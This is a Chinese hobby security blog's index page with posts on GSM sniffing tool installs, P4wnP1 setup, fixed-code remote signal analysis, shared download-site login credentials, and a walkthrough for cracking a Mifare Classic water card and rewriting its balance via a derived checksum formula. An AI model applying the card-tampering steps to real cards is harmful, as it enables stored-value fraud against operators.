<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="devil0x菜鸟">
<meta property="og:url" content="https://devil0x.github.io/index.html">
<meta property="og:site_name" content="devil0x菜鸟">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="devil0x菜鸟">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://devil0x.github.io/">





  <title>devil0x菜鸟</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">devil0x菜鸟</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/03/06/备用事件/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/06/备用事件/" itemprop="url">备用事件</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-06T00:00:42+08:00">
                2019-03-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="百度文库下载"><a href="#百度文库下载" class="headerlink" title="百度文库下载"></a>百度文库下载</h1><p>卡号：ui7822892je<br>密码：ftaskf5<br>步骤一：直接点击打开：<a href="http://www.wenku666.com" target="_blank" rel="noopener">http://www.wenku666.com</a><br>步骤二：复制我们的账号密码进去。<br>步骤三：复制你需要下载的文档地址进去。点击下载等待几秒即可</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/02/17/gsm/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/17/gsm/" itemprop="url">gsm</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-17T10:28:38+08:00">
                2019-02-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="0x01-先安装依赖"><a href="#0x01-先安装依赖" class="headerlink" title="0x01.先安装依赖"></a>0x01.先安装依赖</h1><p><strong>0x01.安装编译依赖包</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy</span><br></pre></td></tr></table></figure>
<h1 id="0x02-编译安装gr-gsm"><a href="#0x02-编译安装gr-gsm" class="headerlink" title="0x02.编译安装gr-gsm"></a>0x02.编译安装gr-gsm</h1><h4 id="编译gr-gsm老是不通过"><a href="#编译gr-gsm老是不通过" class="headerlink" title="编译gr-gsm老是不通过"></a>编译gr-gsm老是不通过</h4><p>解决方法：先安装gr-osmosdr再编译gr-gsm，秒过</p>
<h4 id="1-安装gr-osmosdr"><a href="#1-安装gr-osmosdr" class="headerlink" title="1.安装gr-osmosdr"></a>1.安装gr-osmosdr</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone git://git.osmocom.org/gr-osmosdr</span><br><span class="line">cd gr-osmosdr/</span><br><span class="line">mkdir build</span><br><span class="line">cd build/</span><br><span class="line">cmake ../</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<p>要是还有问题的话，看这两个链接：有前辈遇到问题是的解决经验</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://osmocom.org/projects/gr-osmosdr/wiki</span><br><span class="line">https://github.com/ptrkrysik/gr-gsm/issues/431</span><br></pre></td></tr></table></figure>
<h4 id="2-安装gr-gsm"><a href="#2-安装gr-gsm" class="headerlink" title="2. 安装gr-gsm"></a>2. 安装gr-gsm</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ptrkrysik/gr-gsm.git</span><br><span class="line">cd gr-gsm</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<h1 id="0x03-编译kalibrate"><a href="#0x03-编译kalibrate" class="headerlink" title="0x03.编译kalibrate"></a>0x03.编译kalibrate</h1><p>HackRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kalibrate-hackrf (kalibrate For HackRF)</span><br><span class="line">git clone https://github.com/scateu/kalibrate-hackrf.git</span><br><span class="line">cd kalibrate-hackrf</span><br><span class="line">./bootstrap</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>RTL-SDR 电视棒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kalibrate-rtl(kalibrate For rtl-sdr)</span><br><span class="line">git clone https://github.com/steve-m/kalibrate-rtl.git</span><br><span class="line">cd kalibrate-rtl</span><br><span class="line">./bootstrap</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<h5 id="0x0-0要是遇到问题"><a href="#0x0-0要是遇到问题" class="headerlink" title="0x0.0要是遇到问题:"></a>0x0.0要是遇到问题:</h5><p>先下载，编译和安装 RTL2832U Osmocom 驱动:</p>
<p><strong>注意:</strong> </p>
<ul>
<li><strong>在从 git 上下载和编译新版本的 rtlsdr 之前，如果已经安装了其它版本需要首先运行 “make uninstall”来卸载该版本。</strong></li>
<li><strong>为了能够在 Ubuntu 中以普通用户身份使用电视棒RTL-SDR，需要通过在 cmake 命令后指定参数 “-DINSTALL_UDEV_RULES=ON” 来安装合适的 udev 规则文件。</strong> </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone git://git.osmocom.org/rtl-sdr.git</span><br><span class="line">cd rtl-sdr/</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ../ -DINSTALL_UDEV_RULES=ON</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line">cp ../rtl-sdr.rules /etc/udev/rules.d/</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/02/03/freebuf第一次/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/03/freebuf第一次/" itemprop="url">freebuf</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-03T22:15:02+08:00">
                2019-02-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-初学RFID"><a href="#1-初学RFID" class="headerlink" title="1. 初学RFID"></a>1. 初学RFID</h1><h4 id="1-前情提要"><a href="#1-前情提要" class="headerlink" title="1.前情提要"></a>1.前情提要</h4><p>Mifare Classic card提供1k-4k的容量，我们经常见到的是Mifare Classic 1k(S50)，也就是所谓的M1卡。M1卡有从0到15共16个扇区，每个扇区配备了从0到3共块个段，每个段分为b0到b15共16个区块，并且可以保存16字节的内容。</p>
<p>每个扇区的第4段呢是用来保存KeyA，KeyB和控制位的，每张卡的0扇区还有一个唯一标识的UID号。</p>
<p><strong>破解原理</strong></p>
<p>这种卡类的攻击方式大概分为这么几种：</p>
<p><strong>1</strong>）暴力破解</p>
<p>爆破对于M1卡的破解来说比较有效，因为M1卡是被动卡，需要读卡器来供能，切断供能后卡的临时数据就丢失了，也就是说不会存在输入过多错误密码后造成的锁死之类的情况</p>
<p>FFFFFFFFFFFF、A0B0C0D0E0F0等等都是M1白卡的默认密码，所以当我们使用acr122u的配套软件M1卡服务程序这样的工具来爆破的时候基本上都是用这些默认密码来填充剩余扇区的密码。</p>
<p><strong>2</strong>）克隆卡片（卡复制）</p>
<p>M1卡的扇区可以保存数据，所以大部分的卡片会选择加密扇区后保存数据，我们可以用 uid卡来进行复制，每张M1卡在0扇区第1段都有一个唯一标识，而且是保护无法修改的，uid 卡就是没有设定0扇区保护的卡，所以你可以随意的修改你想要的uid，这样我们就可以克隆出一张连uid都相同的卡片了。</p>
<p><strong>3</strong>）嗅探攻击</p>
<p>在卡和机器数据交换的时候嗅探数据，并计算出校验即可。后期可在安卓端用app：M Tools进行数据的嗅探。</p>
<p>已经有很多篇文章讲过了原理部分，直接讲一下阶段</p>
<h4 id="2-所需工具"><a href="#2-所需工具" class="headerlink" title="2. 所需工具:"></a>2. 所需工具:</h4><p>硬件： ACR122u(最常见的rfid设备，本质就是pn532，但是有个足够强的上位机，比pn532容易上手。没买pm3是因为感觉贵，没啥必要。。。)</p>
<p>软件：m1卡程序，fixdump，sublime Text3，UID写卡程序</p>
<p>以及安卓端：mifare classical tools, M Tools(神器)</p>
<p>mifare classical tools是一款让人又爱又恨的软件，但是远远不如M Tools强大得多。。。 </p>
<h4 id="4-实际操作："><a href="#4-实际操作：" class="headerlink" title="4 . 实际操作："></a>4 . 实际操作：</h4><p><strong>1.</strong> <strong>首先把acr122u的驱动叽里呱啦的安装好。</strong></p>
<p><strong>2.</strong> <strong>把水卡放置道读卡上，正确识别之后灯会变为黄色。</strong></p>
<p>3.打开m1服务软件，正确识别机器之后，点击开始破解。</p>
<p><img src="https://image.3001.net/images/20190203/1549195573_5c56d935b9cac.png!small" alt="1.png">破解完成当即获得一个1kb dump文件，现在可以直接拖进sublime text3，即可看出扇区密钥。</p>
<p>6.为了容易看出金额差别，用手机端app：mifare打开m1卡，</p>
<p><img src="https://image.3001.net/images/20190203/1549196895_5c56de5fd60a6.png!small" alt="2.png"><br>会发现没有3号4号扇区的key，</p>
<p>用sublime打开dumpfile1.dump</p>
<p><img src="https://image.3001.net/images/20190203/1549196905_5c56de6974e4e.png!small" alt="3.png"></p>
<p>每个扇区的第4块区域，前半部为keyA 后半为keyB</p>
<p>直接导入mifare 工具，手机端图形界面好观察一些。<img src="https://image.3001.net/images/20190203/1549197158_5c56df66a6331.png!small" alt="4.png"></p>
<p>直接可以看到改扇区的信息了。先把现在的这份数据保存一下，然后再去机器那里刷一下机器，然后就可以看出数据变化位了，后就可以确定数据位和校验位了。</p>
<p><img src="https://image.3001.net/images/20190203/1549197071_5c56df0f42a54.png!small" alt="5.png"></p>
<p>随即就发现了一些端倪。这几个数值出现了变化，</p>
<p><strong>E4 12</strong> <strong>DC 90</strong></p>
<p><strong>E8 12</strong> <strong>DB 93</strong></p>
<p>把前两部分导进进制转换器</p>
<p><img src="https://image.3001.net/images/20190203/1549199067_5c56e6db49ba4.png!small" alt="6.png"></p>
<p>刚好是金额位，那么剩下的就是。。。。校验位。</p>
<p>这都8102年了，之前经常逛酷安，知道一款神器，M Tools</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/9.png" alt="Image"></p>
<p>这是一款酷安基佬开发的app，最神奇的是作者录制了视频教程，但是地址确是在油管，并附有中式英语进行讲解。现在还有一款app是M Keys也是该作者的作品，这两款app现在也都支持外置ACR122U了，so没有nfc的手机也可以外置进行操作。</p>
<p>这个app也需要提前把密钥导进去，然后就可以对扇区数据进行操作</p>
<p><img src="https://image.3001.net/images/20190203/1549201905_5c56f1f1e4074.png!small" alt="10.png"><br>这货可以预置常用的算法，什么十六进制倒序，倍数转换啊，直接一点即可。</p>
<p>然后就找到之前发现的金额位数据，直接就可以转换成47.40，然后下一不是选择校验位的算法，but真的看不出有何端倪，直接先跳过了。然后来到这个app的核心功能，嗅探校验位算法。于是，在刷卡机器旁边，冲冲放放这样来了十几个来回，嗅探到了一下数据。</p>
<p><img src="https://image.3001.net/images/20190203/1549201963_5c56f22b324f4.png!small" alt="11.png">目前已知的校验位计算方法有这么几种：</p>
<p><img src="https://image.3001.net/images/20190203/1549202610_5c56f4b28847c.png!small" alt="12.png"></p>
<p>反正就是加减乘除，异或取反，各种操作挨个试。看了好久没看出来，就去翻着去看了几篇教程，发现了一些端倪。</p>
<p><img src="https://image.3001.net/images/20190203/1549202664_5c56f4e8b808c.png!small" alt="13.png"></p>
<p>但就是这个b12部分一直啥都看不出来，真的是毫无规律可循。但其他部分应该还是很好知道规律的</p>
<p>such as：第2块与第1块做对比，金额位b0差-4，b1没有差别，b12差+1, b15差-3，刚好钱差0.04</p>
<p>同理第3与第4块的做对比，金额位b0差-8，b1没有差别，b12差+1, b15差-7，刚好钱差0.08</p>
<p>那么可知，凑一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> b0 + b1 + b12-b15 = 某定值</span><br><span class="line">(-4)+(0) +(+1)-(-3)</span><br></pre></td></tr></table></figure>
<p>的话总值是没有变化的没有变化。</p>
<p>把这些数换到10进制计算出这个某定值为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">88(hex)+12(hex)+8(hex)-60(hex) = 66(十进制)</span><br></pre></td></tr></table></figure>
<p>所以b15的公式就是：b15=b0+b1+b12-66</p>
<p>把公式填进M Tools，直接成功完成验证：</p>
<p><img src="https://image.3001.net/images/20190203/1549202700_5c56f50c29d24.png!small" alt="14.png"></p>
<p>但是这个b12什么鬼，什么规律都没有。。。。。。。。</p>
<p>但后来经过自己观察，这个可能是随机的，从图上可知每刷一次都递增一下，从00开始，such as：08.09.0A。。。。。。</p>
<p>\5. 修改数据：</p>
<p>到了修改数据的地方，这都8102年了，提供一个更快的思路，直接用M Tools。再充值的地方，长按有个定额的选项，直接填入即可。</p>
<p>然后就修改成功了，改个奇数位试试，<img src="https://image.3001.net/images/20190203/1549202946_5c56f6029ddd2.png!small" alt="18.png"></p>
<h1 id="2-终语。"><a href="#2-终语。" class="headerlink" title="2.终语。"></a>2.终语。</h1><p>这算是遇到一个贼拉简单的校验，甚至连异或检验都没有。经过多次的计算校验，感觉计算校验就一条总结：羊毛出在羊身上。</p>
<p>1.用好winhex，逆向计算器</p>
<p>2.最重要的，校验的奥义：羊毛出在羊身上。就是说，校验位在哪里，你可以通过多看几个数据的变化来看出。而校验的产生，总是遵循金额位的变化，校验不管咋变，都是金额位数值通过各种公式组合加计算出来的。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/01/21/树莓派/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/21/树莓派/" itemprop="url">树莓派备份</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-21T21:38:25+08:00">
                2019-01-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>修改wifi连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>
<p>设置wifi自动连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/visionsl/p/8117317.html</span><br></pre></td></tr></table></figure>
<p>安装P4wnp1 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git</span><br><span class="line">cd /home/pi</span><br><span class="line">git clone --recursive https://github.com/mame82/P4wnP1</span><br><span class="line">cd P4wnP1</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/01/10/固定码逆向分析/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/10/固定码逆向分析/" itemprop="url">固定码逆向分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-10T22:26:10+08:00">
                2019-01-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="固定码逆向分析"><a href="#固定码逆向分析" class="headerlink" title="固定码逆向分析"></a>固定码逆向分析</h1><p> 环境：kali</p>
<h2 id="0x01-Analysis-信号分析"><a href="#0x01-Analysis-信号分析" class="headerlink" title="0x01. Analysis 信号分析"></a>0x01. <strong>Analysis 信号分析</strong></h2><p>分析信号可使用音频处理软件Audacity：</p>
<p>不过这种方式需要肉眼将波形转化成0跟1，看起来比较容易眼花。so用软件辅助一下</p>
<h2 id="1-1安装软件"><a href="#1-1安装软件" class="headerlink" title="1.1安装软件"></a>1.1<strong>安装软件</strong></h2><h3 id="1-inspectrum"><a href="#1-inspectrum" class="headerlink" title="1.inspectrum"></a>1.inspectrum</h3><p>在这篇文章中我们将通过inspectrum(<a href="https://github.com/miek/inspectrum" target="_blank" rel="noopener">https://github.com/miek/inspectrum</a>)这个工具来分析信号，配合Python将信号转成二进制数据。</p>
<p>先安装所需的环境，再安装inspectrum。类似的软件还有DSpectrumGUI都行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qt5-default libfftw3-dev cmake pkg-config libliquid-dev</span><br><span class="line">git clone https://github.com/miek/inspectrum.git </span><br><span class="line">mkdir build </span><br><span class="line">cd build </span><br><span class="line">cmake .. </span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="2-universal-radio-hacker-urh"><a href="#2-universal-radio-hacker-urh" class="headerlink" title="2. universal radio hacker(urh)"></a>2. universal radio hacker(urh)</h3><p>有windos版直接下载即可</p>
<h3 id="3-HDSHR"><a href="#3-HDSHR" class="headerlink" title="3.HDSHR"></a>3.HDSHR</h3><p>下载之后需要加载一下rt sdr的驱动</p>
<p>地址：<a href="https://github.com/devil0x/wireless-analyze/blob/master/%E8%BD%AF%E4%BB%B6/ExtIO_RTL2832.dll" target="_blank" rel="noopener">https://github.com/devil0x/wireless-analyze/blob/master/%E8%BD%AF%E4%BB%B6/ExtIO_RTL2832.dll</a></p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/2.png" alt=""></p>
<p>即可开始监听特定频段。</p>
<h2 id="0x02-分析文件"><a href="#0x02-分析文件" class="headerlink" title="0x02.分析文件"></a>0x02.分析文件</h2><p>文件地址：<a href="https://github.com/mobier/WirelessSample" target="_blank" rel="noopener">https://github.com/mobier/WirelessSample</a></p>
<h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p><img src="https://image.3001.net/images/20181211/1544496759_5c0f2677573f8.png!small" alt=""></p>
<p>摘抄：信号脉冲的宽度跟电压，震荡电阻是有关系的。我们可以算出信号的震荡周期（a=两倍的时钟震荡周期）f=2100016/Rosc(kΩ) kHz 其中 Rosc 为振荡电阻。</p>
<p>我们来看下这两种信号的区别，第一种信号吧 Bit1 相当于 12A 宽度的高电平脉冲加 4A 宽度低电平的脉冲重复一次，而BIt0正好相反是 4a 高在是 12a 的低重复一次。然后说下 BitF，BitF 只会出现在地址位里面，代表该地址位引脚悬空，后面会提到，无效码则不可能出现在 2262 这种协议中，如果出现了只能表示这个信号是 2240 的。</p>
<p>现在来说下第二种信号格式，第二种与第一种不同，非常明显能看出来第一种是把一段信号重复了两次来表示BIT1 和 BIT0，并且有三种表示方式。第二种呢就是 12A 宽度的高电平脉冲信号加上 4A 的低电平宽度脉冲信号就是 BIT1，相反的就是 BIT0，并且不像第一种那样数据有 3 种表示方式。</p>
<h3 id="2-PT226X"><a href="#2-PT226X" class="headerlink" title="2.PT226X"></a>2.PT226X</h3><p><img src="https://image.3001.net/images/20181211/1544496739_5c0f2663762a9.png!small" alt=""></p>
<p>首先来看一下PT226x的结构</p>
<p>案例是录制的门铃的文件，433.92mhz，ASK调制。</p>
<p><img src="C:\Users\skywa\Pictures\1.19\3.png" alt=""></p>
<p>录制的文件是raw格式，我用的win10的udr打开的该文件。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/4.png" alt=""></p>
<p>选择ask解调。</p>
<p>再放大即可</p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/6.png" alt=""></p>
<p>前部是4bit同步码，后半部分根据结构看的话，先是地址码，再之后为数据码。</p>
<p>图中红线圈起来的刚好是与开始的案例相同的即：FFF0FFFF，再后边的数据码是1111。比对方式见开头图片关于PT226x的部分</p>
<p>当然用另一种方法，直接在选择这样配置即可看出每段的二进制数据。</p>
<p>1是11101110</p>
<p>0是10001000</p>
<p>F是10001110</p>
<p><img src="https://github.com/devil0x/picture/raw/master/1.19/13.png" alt=""></p>
<h3 id="3-PT224X"><a href="#3-PT224X" class="headerlink" title="3.PT224X"></a>3.PT224X</h3><p><img src="https://image.3001.net/images/20181211/1544496739_5c0f266399bbe.png!small" alt=""></p>
<p>首先依旧是PT224X的结构部分，同样是先同步码后地址码再数据位的结构。</p>
<p>区别就是位数更长。还有一个区别2240和2262的方法，只要有F就肯定是226X。</p>
<p>案例给了2个录制好的文件，一个niu2.cs8，另一个PT2242.cs8。直接拖进urh打开是混乱的，可以先用audacity选择导入原数据。</p>
